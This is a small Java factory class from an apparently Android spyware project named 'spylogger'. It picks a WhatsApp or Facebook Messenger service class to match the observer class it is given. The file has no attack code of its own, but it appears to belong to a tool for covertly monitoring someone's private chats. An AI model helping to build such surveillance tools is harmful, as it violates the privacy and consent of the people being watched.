package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.observers.FaceDbObserver;
import com.gravatasufoca.spylogger.observers.WhatsDbObserver;
import com.gravatasufoca.spylogger.services.Mensageiro;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.services.WhatsAppService;

/**
 * Created by bruno on 21/04/17.
 */

public class MensageiroFactory {

    private Context context;

    public MensageiroFactory(Context context) {
        this.context = context;
    }

    public Mensageiro build(String classe){
        try {
            Class clazz=Class.forName(classe);

            if(clazz!=null){
                if(clazz.equals(WhatsDbObserver.class)){
                    return new WhatsAppService(context);
                }

                if(clazz.equals(FaceDbObserver.class)){
                    return new MessengerService(context);
                }
            }
        } catch (ClassNotFoundException e) {
            Log.e("spylogger",e.getMessage());
        }
        return null;
    }
}
